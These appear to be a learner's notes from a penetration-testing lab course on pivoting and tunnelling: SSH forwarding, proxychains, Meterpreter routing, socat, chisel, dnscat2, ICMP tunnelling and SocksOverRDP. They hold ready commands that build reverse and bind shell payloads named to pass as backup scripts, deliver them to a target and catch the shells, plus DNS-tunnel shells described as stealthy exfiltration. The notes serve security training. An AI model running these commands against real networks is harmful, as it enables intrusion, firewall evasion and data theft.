Port forwarding is a technique that allows us to redirect a communication request from one port to another. Port forwarding uses TCP as the primary communication layer to provide interactive communication for the forwarded port. However, different application layer protocols such as SSH or even SOCKS (non-application layer) can be used to encapsulate the forwarded traffic. This can be effective in bypassing firewalls and using existing services on your compromised host to pivot to other networks.




                        -----SSH Local Port Forwarding

    Lets say we scan a target an we found that the server is listening on port 22 to ssh connections and that mysql on port 3306 is closed for connections outside the internal network .

    To access the MySQL service, we can either SSH into the server and access MySQL from inside the Ubuntu server, or we can port forward it to our localhost on port 1234 and access it locally.

    A benefit of accessing it locally is if we want to execute a remote exploit on the MySQL service, we won't be able to do it without port forwarding.

     So, we will use the below command to forward our local port (1234) over SSH to the Ubuntu server.

     
     $ ssh -L 1234:localhost:3306 username@x.x.x.x

     The -L command tells the SSH client to request the SSH server to forward all the data we send via the port 1234 to localhost:3306 on the Ubuntu server. By doing this, we should be able to access the MySQL service locally on port 1234. We can use Netstat or Nmap to query our local host on 1234 port to verify whether the MySQL service was forwarded.


     Similarly, if we want to forward multiple ports from the Ubuntu server to your localhost, you can do so by including the local port:server:port argument to your ssh command. For example, the below command forwards the apache web server's port 80 to your attack host's local port on 8080.

     $ ssh -L 1234:localhost:3306 8080:localhost:80 username@x.x.x.x



            ---Setting up to Pivot

     if you type ifconfig on the Ubuntu host, you will find that this server has multiple NICs:

    One connected to our attack host (ens192)
    One communicating to other hosts within a different network (ens224)
    The loopback interface (lo).


    Unlike the previous scenario where we knew which port to access, in our current scenario, we don't know which services lie on the other side of the network. So, we can scan smaller ranges of IPs on the network (172.16.5.1-200) network or the entire subnet (172.16.5.0/23). We cannot perform this scan directly from our attack host because it does not have routes to the 172.16.5.0/23 network. To do this, we will have to perform dynamic port forwarding and pivot our network packets via the Ubuntu server. We can do this by starting a SOCKS listener on our local host  and then configure SSH to forward that traffic via SSH to the network (172.16.5.0/23) after connecting to the target host.


    This is called SSH tunneling over SOCKS proxy. SOCKS stands for Socket Secure, a protocol that helps communicate with servers where you have firewall restrictions in place. Unlike most cases where you would initiate a connection to connect to a service, in the case of SOCKS, the initial traffic is generated by a SOCKS client, which connects to the SOCKS server controlled by the user who wants to access a service on the client-side. Once the connection is established, network traffic can be routed through the SOCKS server on behalf of the connected client.

    This technique is often used to circumvent the restrictions put in place by firewalls, and allow an external entity to bypass the firewall and access a service within the firewalled environment. One more benefit of using SOCKS proxy for pivoting and forwarding data is that SOCKS proxies can pivot via creating a route to an external server from NAT networks. SOCKS proxies are currently of two types: SOCKS4 and SOCKS5. SOCKS4 doesn't provide any authentication and UDP support, whereas SOCKS5 does provide that.

    the attack host starts the SSH client and requests the SSH server to allow it to send some TCP data over the ssh socket. The SSH server responds with an acknowledgment, and the SSH client then starts listening on localhost:9050. Whatever data you send here will be broadcasted to the entire network (172.16.5.0/23) over SSH. We can use the below command to perform this dynamic port forwarding.

    $ ssh -D 9050 ubuntu@10.129.202.64

    The -D argument requests the SSH server to enable dynamic port forwarding. Once we have this enabled, we will require a tool that can route any tool's packets over the port 9050. We can do this using the tool proxychains, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together. Using proxychains, we can hide the IP address of the requesting host as well since the receiving host will only see the IP of the pivot host. Proxychains is often used to force an application's TCP traffic to go through hosted proxies like SOCKS4/SOCKS5, TOR, or HTTP/HTTPS proxies.

    To inform proxychains that we must use port 9050, we must modify the proxychains configuration file located at /etc/proxychains.conf. We can add socks4 127.0.0.1 9050 to the last line if it is not already there.

    Now when you start Nmap with proxychains using the below command, it will route all the packets of Nmap to the local port 9050, where our SSH client is listening, which will forward all the packets over SSH to the 172.16.5.0/23 network.

    $ proxychains nmap -v -sn 172.16.5.1-200

    This part of packing all your Nmap data using proxychains and forwarding it to a remote server is called SOCKS tunneling. One more important note to remember here is that we can only perform a full TCP connect scan over proxychains. The reason for this is that proxychains cannot understand partial packets. If you send partial packets like half connect scans, it will return incorrect results. We also need to make sure we are aware of the fact that host-alive checks may not work against Windows targets because the Windows Defender firewall blocks ICMP requests (traditional pings) by default.

    A full TCP connect scan without ping on an entire network range will take a long time.


    Similar to the Nmap scan, we can also pivot msfconsole via proxychains to perform vulnerable RDP scans using Metasploit auxiliary modules. We can start msfconsole with proxychains.


    $ proxychains msfconsole

    setting rhosts on msfconsole means u set the internal ip of the target


    we can also rdp to a target using proxychains

    $ proxychains xfreerdp /v:172.16.5.19 /u:username /p:password

    We have seen local port forwarding, where SSH can listen on our local host and forward a service on the remote host to our port, and dynamic port forwarding, where we can send packets to a remote network via a pivot host. But sometimes, we might want to forward a local service to the remote port as well.


    in the example where we access a target in the internal network pivoting through the ssh server which isfacing the internet using dynamic port forwarding, we wont be able to get a reverse shell to the target as there is no route between it and our attack machine.

    There are several times during a penetration testing engagement when having just a remote desktop connection is not feasible. You might want to upload/download files (when the RDP clipboard is disabled), use exploits or low-level Windows API using a Meterpreter session to perform enumeration on the Windows host, which is not possible using the built-in Windows executables.

    In these cases, we would have to find a pivot host, which is a common connection point between our attack host and the Windows server. In our case, our pivot host would be the Ubuntu server since it can connect to both: our attack host and the Windows target. To gain a Meterpreter shell on Windows, we will create a Meterpreter HTTPS payload using msfvenom, but the configuration of the reverse connection for the payload would be the Ubuntu server's host IP address (172.16.5.129). We will use the port 8080 on the Ubuntu server to forward all of our reverse packets to our attack hosts' 8000 port, where our Metasploit listener is running.

    $ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

    set up our msf listener

    msf6 > use exploit/multi/handler
    msf6 > set lhost 0.0.0.0
    msf6 > set lport 8000
    msf6 > run


    Once our payload is created and we have our listener configured & running, we can copy the payload to the Ubuntu server using the scp command since we already have the credentials to connect to the Ubuntu server using SSH.

    $ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/

    After copying the payload, we will start a python3 HTTP server using the below command on the Ubuntu server in the same directory where we copied our payload.

    $ python3 -m http.server 8123

    We can download this backupscript.exe from the Windows host via a web browser or the PowerShell cmdlet Invoke-WebRequest.

    PS > Invoke-WebRequest -Uri "http://<InternalIPofPivotHost>:8123/backupscript.exe" -OutFile "C:\backupscript.exe"

    Once we have our payload downloaded on the Windows host, we will use SSH remote port forwarding to forward our msfconsole's listener service on port 8000 to the Ubuntu server's port 8080. We will use -vN argument in our SSH command to make it verbose and ask it not to prompt the login shell. The -R command asks the Ubuntu server to listen on <targetIPaddress>:8080 and forward all incoming connections on port 8080 to our msfconsole listener on 0.0.0.0:8000 of our attack host.


    $ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN

    After creating the SSH remote port forward, we can execute the payload from the Windows target. If the payload is executed as intended and attempts to connect back to our listener, we can see the logs from the pivot on the pivot host.

    If all is set up properly, we will receive a Meterpreter shell pivoted via the Ubuntu server.

    Our Meterpreter session should list that our incoming connection is from a local host itself (127.0.0.1) since we are receiving the connection over the local SSH socket, which created an outbound connection to the Ubuntu server. Issuing the netstat command can show us that the incoming connection is from the SSH service.



    

                            ------Pivoting with meterpreter

       
       We can create a Meterpreter shell for the Ubuntu server with the below command, which will return a shell on our attack host on port 8080.

       $ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080

       Before copying the payload over, we can start a multi/handler, also known as a Generic Payload Handler.

       msf6 > use exploit/multi/handler
       msf6 >  set lhost 0.0.0.0
       msf6 > set lport 8080

       We can copy the backupjob binary file to the Ubuntu pivot host over SSH and execute it to gain a Meterpreter session.

       We know that the Windows target is on the 172.16.5.0/23 network. So assuming that the firewall on the Windows target is allowing ICMP requests, we would want to perform a ping sweep on this network. We can do that using Meterpreter with the ping_sweep module, which will generate the ICMP traffic from the Ubuntu host to the network 172.16.5.0/23.

       meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

       We could also perform a ping sweep using a for loop directly on a target pivot host that will ping any device in the network range we specify. Here are two helpful ping sweep for loop one-liners we could use for Linux-based and Windows-based pivot hosts.

       $ for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done

       windows cmd

       for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

       powershell

       1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}


         Import-Module Microsoft.PowerShell.Management

         $ips = 1..10 | % { "172.16.5.$_" } 

         $ips | ForEach-Object {
            
            $result = Test-Connection -Count 1 -ComputerName $_ -Quiet
            "$($_) $result"
         }





       Note: It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build it's arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built. 

       There could be scenarios when a host's firewall blocks ping (ICMP), and the ping won't get us successful replies. In these cases, we can perform a TCP scan on the 172.16.5.0/23 network with Nmap. Instead of using SSH for port forwarding, we can also use Metasploit's post-exploitation routing module socks_proxy to configure a local proxy on our attack host. We will configure the SOCKS proxy for SOCKS version 4a. This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session.

       msf6 > use auxiliary/server/socks_proxy

       msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050

       msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0

       msf6 auxiliary(server/socks_proxy) > set version 4a

       msf6 auxiliary(server/socks_proxy) > run

       After initiating the SOCKS server, we will configure proxychains to route traffic generated by other tools like Nmap through our pivot on the compromised Ubuntu host. We can add the below line at the end of our proxychains.conf file located at /etc/proxychains.conf if it isn't already there.


       Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. We can use the post/multi/manage/autoroute module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.


       msf6 > use post/multi/manage/autoroute

       msf6 post(multi/manage/autoroute) > set SESSION 1

       msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0

       msf6 post(multi/manage/autoroute) > run

       
       It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.
       
       meterpreter > run autoroute -s 172.16.5.0/23

       After adding the necessary route(s) we can use the -p option to list the active routes to make sure our configuration is applied as expected.

       meterpreter > run autoroute -p

       As you can see from the output above, the route has been added to the 172.16.5.0/23 network. We will now be able to use proxychains to route our Nmap traffic via our Meterpreter session.

       $ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn

       
       
       Port forwarding can also be accomplished using Meterpreter's portfwd module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.

       meterpreter > help portfwd

       --Creating Local TCP Relay
       
       meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

       The above command requests the Meterpreter session to start a listener on our attack host's local port (-l) 3300 and forward all the packets to the remote (-r) Windows server 172.16.5.19 on 3389 port (-p) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.

       $ xfreerdp /v:localhost:3300 /u:victor /p:pass@123



              ------Meterpreter Reverse Port Forwarding



       Similar to local port forwards, Metasploit can also perform reverse port forwarding with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host. We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port 1234 to our listener on port 8081.

       meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

       meterpreter > bg

       msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp

       msf6 exploit(multi/handler) > set LPORT 8081 

       msf6 exploit(multi/handler) > set LHOST 0.0.0.0 

       msf6 exploit(multi/handler) > run

       We can now create a reverse shell payload that will send a connection back to our Ubuntu server on 172.16.5.129:1234 when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to attack host's ip:8081 that we configured.

       $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234


       Finally, if we execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server.

       
       
                            -----Socat

       Socat is a bidirectional relay tool that can create pipe sockets between 2 independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start socat on the Ubuntu server.


       $ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80


       Socat will listen on localhost on port 8080 and forward all the traffic to port 80 on our attack host (10.10.14.18). Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server. We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.


       $ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

       Keep in mind that we must transfer this payload to the Windows host.

       set up metasploit to listen for incoming conections redirected by socat listener on the compromised server 

       msf6 > use exploit/multi/handler
       msf6 > set lhost 0.0.0.0
       msf6 > set lport 80 
       msf6 > set payload windows/x64/meterpreter/reverse_https
       msf6 > run


       Similar to our socat's reverse shell redirector, we can also create a socat bind shell redirector. This is different from reverse shells that connect back from the Windows server to the Ubuntu server and get redirected to our attack host. In the case of bind shells, the Windows server will start a listener and bind to a particular port. We can create a bind shell payload for Windows and execute it on the Windows host. At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target. The below figure should explain the pivot in a much better way.


       We can create a bind shell using msfvenom with the below command

       
       $ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443


       We can start a socat bind shell listener, which listens on port 8080 and forwards packets to Windows server 8443.


       $ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443


       Finally, we can start a Metasploit bind handler. This bind handler can be configured to connect to our socat's listener on port 8080 (Ubuntu server)

       msf6 > use exploit/multi/handler
       msf6 > set payload windows/x64/meterpreter/bind_tcp
       msf6 > set lhost 0.0.0.0
       msf6 > set lport 8080

       msf6 > run 






                            -----plink.exe   (windows ssh)

       Plink, short for PuTTY Link, is a Windows command-line SSH tool that comes as a part of the PuTTY package when installed. Similar to SSH, Plink can also be used to create dynamic port forwards and SOCKS proxies. 


       Another Windows-based tool called Proxifier can be used to start a SOCKS tunnel via the SSH session we created. Proxifier is a Windows tool that creates a tunneled network for desktop client applications and allows it to operate through a SOCKS or HTTPS proxy and allows for proxy chaining. It is possible to create a profile where we can provide the configuration for our SOCKS server started by Plink on port 9050.


       After configuring the SOCKS server for 127.0.0.1 and port 9050, we can directly start mstsc.exe to start an RDP session with a Windows target that allows RDP connections.


       

                            ----- sshuttle

       Sshuttle is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers. Sshuttle can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. We can configure the Ubuntu server as a pivot point and route all of Nmap's network traffic with sshuttle using the example later in this section.

       One interesting usage of sshuttle is that we don't need to use proxychains to connect to the remote hosts. Let's install sshuttle via our Ubuntu pivot host and configure it to connect to the Windows host via RDP.


       $ sudo apt-get install sshuttle


       $ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 



                            -----Rpivot

       
       Rpivot is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side. We will take the scenario below, where we have a web server on our internal network (172.16.5.135), and we want to access that using the rpivot proxy.


       We can start our rpivot SOCKS proxy server using the below command to allow the client to connect on port 9999 and listen on port 9050 for proxy pivot connections.


       $ sudo git clone https://github.com/klsecservices/rpivot.git


       $ sudo apt-get install python2.7

       $ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

       Before running client.py we will need to transfer rpivot to the target. We can do this using this SCP command:

       $ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/

       ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999



       We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.

       Finally, we should be able to access the webserver on our server-side, which is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox.


       proxychains firefox-esr 172.16.5.135:80

       \\\Connecting to a Web Server using HTTP-Proxy & NTLM Auth

       python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>





                            -----Port Forwarding with Windows Netsh

       
       Netsh is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use Netsh for:

    Finding routes
    Viewing the firewall configuration
    Adding proxies
    Creating port forwarding rules


       We can use netsh.exe to forward all data received on a specific port (say 8080) to a remote host on a remote port. This can be performed using the below command.


       C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25


       After configuring the portproxy on our Windows-based pivot host, we will try to connect to the 8080 port of this host from our attack host using xfreerdp. Once a request is sent from our attack host, the Windows host will route our traffic according to the proxy settings configured by netsh.exe.



       

                            ------DNS Tunneling with Dnscat2

       
       Dnscat2 is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted Command-&-Control (C&C or C2) channel and sends data inside TXT records within the DNS protocol. Usually, every active directory domain environment in a corporate network will have its own DNS server, which will resolve hostnames to IP addresses and route the traffic to external DNS servers participating in the overarching DNS system. However, with dnscat2, the address resolution is requested from an external server. When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request. Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic. For our testing example, we can use dnscat2 server on our attack host, and execute the dnscat2 client on another Windows host.


       $ git clone https://github.com/iagox86/dnscat2.git

       cd dnscat2/server/
       sudo gem install bundler
       bundle install


       Starting the dnscat2 server

       $ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

       After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server. We can use the client with the dnscat2 project or use dnscat2-powershell, a dnscat2 compatible PowerShell-based client that we can run from Windows targets to establish a tunnel with our dnscat2 server. We can clone the project containing the client file to our attack host, then transfer it to the target.

       $ git clone https://github.com/lukebaggett/dnscat2-powershell.git

       Importing dnscat2.ps1

       PS C:\htb> Import-Module .\dnscat2.ps1

       After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.

       PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 

       We can list the options we have with dnscat2 by entering ? at the prompt.

       We can use dnscat2 to interact with sessions and move further in a target environment on engagements. We will not cover all possibilities with dnscat2 in this module, but it is strongly encouraged to practice with it and maybe even find creative ways to use it on an engagement. Let's interact with our established session and drop into a shell.




                            ------SOCKS5 Tunneling with Chisel


       Chisel is a TCP/UDP-based tunneling tool written in Go that uses HTTP to transport data that is secured using SSH. Chisel can create a client-server tunnel connection in a firewall restricted environment. Let us consider a scenario where we have to tunnel our traffic to a webserver on the 172.16.5.0/23 network (internal network). We have the Domain Controller with the address 172.16.5.19. This is not directly accessible to our attack host since our attack host and the domain controller belong to different network segments. However, since we have compromised the Ubuntu server, we can start a Chisel server on it that will listen on a specific port and forward our traffic to the internal network through the established tunnel.


       $ git clone https://github.com/jpillora/chisel.git

       We will need the programming language Go installed on our system to build the Chisel binary. With Go installed on the system, we can move into that directory and use go build to build the Chisel binary.

       $ cd chisel
       $ go build

       It can be helpful to be mindful of the size of the files we transfer onto targets on our client's networks, not just for performance reasons but also considering detection. Two beneficial resources to complement this particular concept are Oxdf's blog post "Tunneling with Chisel and SSF" and IppSec's walkthrough of the box Reddish. IppSec starts his explanation of Chisel, building the binary and shrinking the size of the binary at the 24:29 mark of his video.

       Once the binary is built, we can use SCP to transfer it to the target pivot host.

       Then we can start the Chisel server/listener.

      \\\ Running the Chisel Server on the Pivot Host

      $ ./chisel server -v -p 1234 --socks5



       The Chisel listener will listen for incoming connections on port 1234 using SOCKS5 (--socks5) and forward it to all the networks that are accessible from the pivot host. In our case, the pivot host has an interface on the 172.16.5.0/23 network, which will allow us to reach hosts on that network.

       We can start a client on our attack host and connect to the Chisel server.

       $ ./chisel client -v 10.129.202.64:1234 socks

       As you can see in the above output, the Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080. Now we can modify our proxychains.conf file located at /etc/proxychains.conf and add 1080 port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.

       Now if we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.



                            -----Chisel Reverse


       When the Chisel server has --reverse enabled, remotes can be prefixed with R to denote reversed. The server will listen and accept connections, and they will be proxied through the client, which specified the remote. Reverse remotes specifying R:socks will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy.

       We'll start the server in our attack host with the option --reverse.

       \\\Starting the Chisel Server on our Attack Host

       $ sudo ./chisel server --reverse -v -p 1234 --socks5

       Then we connect from the Ubuntu (pivot host) to our attack host, using the option R:socks

       $ ./chisel client -v 10.10.14.17:1234 R:socks


       If we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.

       $ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123





                            ------ICMP Tunneling with SOCKS


       ICMP tunneling encapsulates your traffic within ICMP packets containing echo requests and responses. ICMP tunneling would only work when ping responses are permitted within a firewalled network. When a host within a firewalled network is allowed to ping an external server, it can encapsulate its traffic within the ping echo request and send it to an external server. The external server can validate this traffic and send an appropriate response, which is extremely useful for data exfiltration and creating pivot tunnels to an external server.

       We will use the ptunnel-ng tool to create a tunnel between our Ubuntu server and our attack host. Once a tunnel is created, we will be able to proxy our traffic through the ptunnel-ng client. We can start the ptunnel-ng server on the target pivot host. Let's start by setting up ptunnel-ng.

       $ git clone https://github.com/utoni/ptunnel-ng.git

       \\\Building Ptunnel-ng with Autogen.sh

       $ cd ptunnel-ng
       $ sudo ./autogen.sh 

       After running autogen.sh, ptunnel-ng can be used from the client and server-side. We will now need to transfer the repo from our attack host to the target host. As in previous sections, we can use SCP to transfer the files. If we want to transfer the entire repo and the files contained inside, we will need to use the -r option with SCP.

       $ scp -r ptunnel-ng ubuntu@10.129.202.64:~/


       \\\\Starting the ptunnel-ng Server on the Target Host

       $ sudo ./ptunnel-ng -r10.129.202.64 -R22

       The IP address following -r should be the IP we want ptunnel-ng to accept connections on. In this case, whatever IP is reachable from our attack host would be what we would use. We would benefit from using this same thinking & consideration during an actual engagement.


       Back on the attack host, we can attempt to connect to the ptunnel-ng server (-p <ipAddressofTarget>) but ensure this happens through local port 2222 (-l2222). Connecting through local port 2222 allows us to send traffic through the ICMP tunnel.

       \\\\Connecting to ptunnel-ng Server from Attack Host

       $ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22


       With the ptunnel-ng ICMP tunnel successfully established, we can attempt to connect to the target using SSH through local port 2222 (-p2222).

       \\\Tunneling an SSH connection through an ICMP Tunnel

       $ ssh -p2222 -lubuntu 127.0.0.1

       We may also use this tunnel and SSH to perform dynamic port forwarding to allow us to use proxychains in various ways.

       \\\\\Enabling Dynamic Port Forwarding over SSH

       $ ssh -D 9050 -p2222 -lubuntu 127.0.0.1

       We could use proxychains with Nmap to scan targets on the internal network (172.16.5.x). Based on our discoveries, we can attempt to connect to the target.

       \\\\Proxychaining through the ICMP Tunnel

       $ proxychains nmap -sV -sT 172.16.5.19 -p3389



                     ------RDP and SOCKS Tunneling with SocksOverRDP

       There are often times during an assessment when we may be limited to a Windows network and may not be able to use SSH for pivoting. We would have to use tools available for Windows operating systems in these cases. SocksOverRDP is an example of a tool that uses Dynamic Virtual Channels (DVC) from the Remote Desktop Service feature of Windows. DVC is responsible for tunneling packets over the RDP connection. Some examples of usage of this feature would be clipboard data transfer and audio sharing. However, this feature can also be used to tunnel arbitrary packets over the network. We can use SocksOverRDP to tunnel our custom packets and then proxy through it. We will use the tool Proxifier as our proxy server.


       We can start by downloading the appropriate binaries to our attack host to perform this attack. Having the binaries on our attack host will allow us to transfer them to each target where needed. We will need:

    SocksOverRDP x64 Binaries
    https://github.com/nccgroup/SocksOverRDP/releases

    Proxifier Portable Binary
    https://www.proxifier.com/download/#win-tab


    We can look for ProxifierPE.zip


       We can then connect to the target using xfreerdp and copy the SocksOverRDPx64.zip file to the target. From the Windows target, we will then need to load the SocksOverRDP.dll using regsvr32.exe.

       \\\Loading SocksOverRDP.dll using regsvr32.exe

       C:\Users\htb-student\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll


       Now we can connect to 172.16.5.19 over RDP using mstsc.exe, and we should receive a prompt that the SocksOverRDP plugin is enabled, and it will listen on 127.0.0.1:1080. We can use the credentials victor:pass@123 to connect to 172.16.5.19.

       We will need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to 172.16.5.19. We can then start SocksOverRDP-Server.exe with Admin privileges.

       When we go back to our foothold target and check with Netstat, we should see our SOCKS listener started on 127.0.0.1:1080.

       \\\Confirming the SOCKS Listener is Started

       C:\Users\htb-student\Desktop\SocksOverRDP-x64> netstat -antb | findstr 1080

       After starting our listener, we can transfer Proxifier portable to the Windows 10 target (on the 10.129.x.x network), and configure it to forward all our packets to 127.0.0.1:1080. Proxifier will route traffic through the given host and port. 

       With Proxifier configured and running, we can start mstsc.exe, and it will use Proxifier to pivot all our traffic via 127.0.0.1:1080, which will tunnel it over RDP to 172.16.5.19, which will then route it to 172.16.6.155 using SocksOverRDP-server.exe.

       https://www.youtube.com/watch?v=ZD1mQHZKymQ
      

      
